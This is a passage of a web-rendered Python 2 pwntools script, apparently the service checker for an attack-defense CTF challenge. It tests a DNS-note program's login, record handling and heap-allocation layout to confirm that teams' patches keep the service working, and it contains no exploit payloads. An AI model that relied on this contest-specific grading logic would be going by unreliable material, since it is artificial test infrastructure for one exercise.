class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">coding_check_level = <span class="number">1</span></span><br><span class="line">fmt_check_level = <span class="number">0</span></span><br><span class="line">log_file = <span class="string">'note_check'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">check = <span class="keyword">False</span></span><br><span class="line">file_path = <span class="string">'/home/tsctf/binary/pwn'</span><span class="comment">#/Desktop/DNS_Server'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    round_time = <span class="number">300</span></span><br><span class="line">    slog = <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    round_time = <span class="number">300</span></span><br><span class="line">    slog = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimeoutError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, err=<span class="string">'timeout'</span>)</span>:</span></span><br><span class="line">        Exception.__init__(self, err)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ResponseError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, err=<span class="string">'ErrResponse'</span>)</span>:</span></span><br><span class="line">        Exception.__init__(self, err)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Checker</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    function checker for Question Note</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, _rhost, _port, _timeout)</span>:</span></span><br><span class="line">        <span class="comment"># pwntools init</span></span><br><span class="line">        <span class="keyword">global</span> context</span><br><span class="line">        <span class="keyword">global</span> slog</span><br><span class="line">        context.log_level = <span class="string">'ERROR'</span></span><br><span class="line">        <span class="keyword">if</span> slog:</span><br><span class="line">            context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">        <span class="keyword">if</span> _timeout:</span><br><span class="line">            context.timeout = _timeout</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check result init</span></span><br><span class="line">        self.state = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># local variables init</span></span><br><span class="line">        self.rhost = remote(_rhost, _port)</span><br><span class="line">        self.name = <span class="string">''</span></span><br><span class="line">        self.oip = _rhost</span><br><span class="line">        self.oport = _port</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randstr</span><span class="params">(self, length=<span class="number">10</span>)</span>:</span>  <span class="comment"># generate random string with lowercase</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        space = string.lowercase</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">            index = random.randint(<span class="number">0</span>, len(space) - <span class="number">1</span>)</span><br><span class="line">            result += space[index]</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(self, inputstr)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(inputstr).hexdigest()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_login</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"===============\n&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">        name = self.randstr(<span class="number">7</span>)</span><br><span class="line">        self.rhost.sendline(name)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'OK, I know your name :\n'</span>)</span><br><span class="line">        recv = self.rhost.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> recv:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in login_set_name : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError</span><br><span class="line">        <span class="keyword">if</span> ((name+<span class="string">'\n'</span>) <span class="keyword">in</span> recv)&amp;(fmt_check_level!=<span class="number">0</span>):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] bad patch format vul : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError            </span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'motto:'</span>)</span><br><span class="line">        motto = self.randstr(<span class="number">0x200</span>)</span><br><span class="line">        self.rhost.send(motto)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'3'</span>)</span><br><span class="line">        <span class="keyword">if</span> motto <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvuntil(<span class="string">"&gt;"</span>):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in login_show_motto : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,domain,length,remark,ip)</span>:</span> </span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)    </span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        <span class="comment">#domain_2 = self.randstr(0x30)</span></span><br><span class="line">        self.rhost.sendline(domain)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(length))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        <span class="comment">#remark_2 = self.randstr(0x90)</span></span><br><span class="line">        self.rhost.sendline(remark)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(ip)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self,domain)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)    </span><br><span class="line">        self.rhost.sendline(<span class="string">'4'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'domain:'</span>)</span><br><span class="line">        self.rhost.sendline(domain)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self,domain)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)    </span><br><span class="line">        self.rhost.sendline(<span class="string">'3'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'domain:'</span>)</span><br><span class="line">        self.rhost.sendline(domain)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_DNS</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"===============\n&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">        name = self.randstr(<span class="number">7</span>)</span><br><span class="line">        self.rhost.sendline(name)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'OK, I know your name :\n'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'4'</span>)  </span><br><span class="line">        <span class="comment"># add    </span></span><br><span class="line"></span><br><span class="line">        domain_1 = self.randstr(<span class="number">0x30</span><span class="number">-1</span>)</span><br><span class="line">        domain_2 = self.randstr(<span class="number">0x30</span><span class="number">-1</span>)</span><br><span class="line">        remark_1 = self.randstr(<span class="number">0x50</span><span class="number">-1</span>)</span><br><span class="line">        remark_2 = self.randstr(<span class="number">0x90</span><span class="number">-1</span>)</span><br><span class="line">        remark_3 = self.randstr(<span class="number">0x110</span><span class="number">-1</span>)</span><br><span class="line">        self.add(domain_1,<span class="number">0x50</span>,remark_1,<span class="string">"127.0.0.1"</span>)</span><br><span class="line">        self.add(domain_1,<span class="number">0x90</span>,remark_2,<span class="string">"127.0.0.1"</span>)</span><br><span class="line">        self.add(domain_2,<span class="number">0x110</span>,remark_3,<span class="string">"0.0.0.0"</span>)</span><br><span class="line">        self.parse(domain_1)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"adder : "</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"127.0.0.1"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark: "</span>)</span><br><span class="line">        <span class="keyword">if</span> remark_1 <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"adder : "</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"127.0.0.1"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark: "</span>)</span><br><span class="line">        <span class="keyword">if</span> remark_2 <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError </span><br><span class="line"></span><br><span class="line">        self.parse(domain_2)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"adder : "</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"0.0.0.0"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark: "</span>)</span><br><span class="line">        <span class="keyword">if</span> remark_3 <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.delete(domain_2)</span><br><span class="line">        self.parse(domain_2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"not find!!"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvuntil(<span class="string">"==GOD"</span>):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">'Your Total is '</span>)</span><br><span class="line">        <span class="keyword">return</span> int(self.rhost.recvline()[:<span class="number">-1</span>])</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_money</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">"Cash: $"</span>)</span><br><span class="line">        <span class="keyword">return</span> int(self.rhost.recvline()[:<span class="number">-1</span>])</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.money = self.get_money()</span><br><span class="line">        <span class="keyword">if</span> (self.money!= self.pre_money):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in game : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError                </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"Bet: $"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'1'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'Please Enter H to Hit or S to Stay.'</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'H'</span>)</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            num = self.get_num()</span><br><span class="line">            tmp = self.rhost.recv()</span><br><span class="line">            <span class="comment">#print '[+]',tmp,'[-]'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Would You Like to Hit or Stay?'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                self.rhost.sendline(<span class="string">"H"</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'Enter Y for Yes or N for No'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                win_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">0</span>][<span class="number">-1</span>:])</span><br><span class="line">                loss_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">1</span>][:<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span> self.win &lt; win_num:</span><br><span class="line">                    self.win = win_num</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> self.loss &lt; loss_num:</span><br><span class="line">                    self.loss = loss_num</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = self.rhost.recv()</span><br><span class="line">                <span class="comment">#print '[+]',tmp,'[-]'</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'Would You Like to Hit or Stay?'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                    self.rhost.sendline(<span class="string">"H"</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">'Enter Y for Yes or N for No'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                    win_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">0</span>][<span class="number">-1</span>:])</span><br><span class="line">                    loss_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">1</span>][:<span class="number">1</span>])</span><br><span class="line">                    <span class="keyword">if</span> self.win &lt; win_num:</span><br><span class="line">                        self.win = win_num</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> self.loss &lt; loss_num:</span><br><span class="line">                        self.loss = loss_num</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">-1</span>                </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_game</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.win = <span class="number">0</span></span><br><span class="line">        self.loss = <span class="number">0</span></span><br><span class="line">        self.money = <span class="number">5</span></span><br><span class="line">        self.pre_money = <span class="number">5</span></span><br><span class="line">        self.rhost.sendline(str(<span class="number">0xbabe</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"(Y/N)"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"y"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            self.pre_money += self.round()</span><br><span class="line">            self.rhost.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_heap</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_1 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(<span class="number">0x58</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_2 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)       </span><br><span class="line">        <span class="keyword">if</span> (addr_2-addr_1)!=<span class="number">0x50</span>:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError              </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1.1.1.1"</span>)</span><br><span class="line">        <span class="comment">#test 1</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">"&gt;"</span>)        </span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_3 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(addr_3-addr_2)!=<span class="number">0x80</span>:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError                     </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"dubhe"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(<span class="number">0x110</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_4 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)       </span><br><span class="line">        <span class="keyword">if</span> (addr_4-addr_3)!=<span class="number">0x50</span>:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError              </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1.1.1.1"</span>)     </span><br><span class="line">        <span class="comment">#test 2 </span></span><br><span class="line">        self.delete(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_3 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(addr_3!=addr_1):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError           </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(<span class="number">0x58</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_4 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)       </span><br><span class="line">        <span class="keyword">if</span>(addr_2!=addr_4):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1.1.1.1"</span>)        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">function_check</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.check_login()</span><br><span class="line">            self.rhost.close()</span><br><span class="line">            self.rhost = remote(self.oip, self.oport)</span><br><span class="line">            self.check_DNS()</span><br><span class="line">            <span class="comment">#self.rhost.close()</span></span><br><span class="line">            <span class="comment">#self.rhost = remote(self.oip, self.oport)</span></span><br><span class="line">            <span class="comment">#self.check_game()</span></span><br><span class="line">            self.rhost.close()</span><br><span class="line">            self.rhost = remote(self.oip, self.oport)   </span><br><span class="line">            self.check_heap()</span><br><span class="line">            self.rhost.close()          </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.rhost.close()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            self.state = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    function: check workstate with single ip</span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">        check result</span></span><br><span class="line"><span class="string">        format &#123;'ip': "127.0.0.1", 'status', 0&#125; </span></span><br><span class="line"><span class="string">        0 stands for normal and 1 stands for down</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        checker = Checker(ip, port, <span class="number">10</span>)</span><br><span class="line">        checker.function_check()</span><br><span class="line">        <span class="keyword">return</span> checker.getResult()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'invalid literal for int() with base 10:'</span> <span class="keyword">in</span> e 